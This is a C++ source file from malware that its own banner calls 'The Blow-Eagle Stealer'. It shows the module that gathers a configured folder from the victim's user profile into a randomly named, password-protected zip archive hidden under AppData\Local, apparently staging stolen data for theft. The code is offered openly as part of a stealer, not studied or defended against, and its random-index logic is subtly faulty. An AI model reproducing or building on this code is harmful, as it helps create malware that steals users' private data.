/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

#include "../scripts.h"
#include "../../config/config.cpp"
#include "../../helper/helper.h"

#include <zip.h>


const wchar_t* GetWC(const char* c)
{
    const size_t cSize = strlen(c) + 1;
    wchar_t* wc = new wchar_t[cSize];
    mbstowcs(wc, c, cSize);

    return wc;
}
/*
bool createArchiveWithPassword(const std::string& archiveName, const std::string& password, const std::string& folderPath)
{
    // Open the archive for writing
    zip* archive = zip_open(archiveName.c_str(), ZIP_CREATE | ZIP_TRUNCATE, nullptr);
    if (!archive)
    {
        std::cerr << "Failed to create the archive." << std::endl;
        return false;
    }

    // Set password for the archive
    if (zip_set_default_password(archive, password.c_str()) < 0)
    {
        std::cerr << "Failed to set the archive password." << std::endl;
        zip_close(archive);
        return false;
    }
    zip_error_t error;
    zip_error_init(&error);
    // Add folder contents to the archive
    zip_source* source = zip_source_win32w_create(GetWC(folderPath.c_str()), 0, -1, &error);
    if (!source)
    {
        std::cerr << "Failed to create a source for the folder." << std::endl;
        zip_close(archive);
        return false;
    }

    // Add the source to the archive
    zip_int64_t index = zip_file_add(archive, folderPath.c_str(), source, ZIP_FL_ENC_UTF_8);
    if (index < 0)
    {
        std::cerr << "Failed to add the folder contents to the archive." << std::endl;
        zip_source_free(source);
        zip_close(archive);
        return false;
    }

    // Close the archive
    if (zip_close(archive) < 0)
    {
        std::cerr << "Failed to close the archive." << std::endl;
        return false;
    }

    std::cout << "Archive created successfully." << std::endl;
    return true;
}
*/

int create_archive(std::string archive_name, std::string password, std::string folder_path) {
    /*
    This function creates a zip archive with a password and a folder using libzip library.

    Parameters:
    archive_name (std::string): The name of the archive to be created
    password (std::string): The password to be used for the archive
    folder_path (std::string): The path of the folder to be added to the archive

    Returns:
    int: 0 if the archive was created successfully, -1 otherwise
    */
    try {
        // Open the archive
        zip_t* archive = zip_open(archive_name.c_str(), ZIP_CREATE | ZIP_EXCL, NULL);
        if (!archive) {
            throw std::runtime_error("Failed to create archive");
        }

        // Add the folder to the archive
        zip_source_t* source = zip_source_file(archive, folder_path.c_str(), 0, 0);
        if (!source) {
            throw std::runtime_error("Failed to add folder to archive");
        }

        // Set the password for the archive
        if (zip_set_default_password(archive, password.c_str()) < 0) {
            throw std::runtime_error("Failed to set password for archive");
        }

        // Add the folder to the archive
        if (zip_add(archive, folder_path.c_str(), source) < 0) {
            throw std::runtime_error("Failed to add folder to archive");
        }

        // Close the archive
        if (zip_close(archive) < 0) {
            throw std::runtime_error("Failed to close archive");
        }

        return 0;
    }
    catch (std::exception& e) {
        // Log the error
        std::cerr << "Error: " << e.what() << std::endl;
        return -1;
    }
}


void manager::MakeZip()
{
    std::string user = func::GetUser();

	std::string symbols = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";
	std::string name = "";
	std::string pwd = "";
	srand(time(0));
	for (size_t i = 0; i < 30; i++)
	{
		int number = (rand() % (std::size(symbols) - 0 + 1)) + 0;
		name += symbols[number];
	}
    std::string appdata = "C:/Users/" + user + "/AppData/Local";

    name += ".zip";

    name = appdata + "/" + name;

	for (size_t i = 0; i < 60; i++)
	{
		int number = (rand() % (std::size(symbols) - 0 + 1)) + 0;
		pwd += symbols[number];
	}

	std::cout << "zipName: " << name << "\nzipPWD: " << pwd << "\n";

    const std::string folderPath = "C:/Users/" + user + config::path;

    /*if (createArchiveWithPassword(name, pwd, folderPath)) {
        std::cout << "Archive created successfully." << std::endl;
    }
    else {
        std::cerr << "Failed to create archive." << std::endl;
    }*/

    create_archive(name, pwd, folderPath);
}
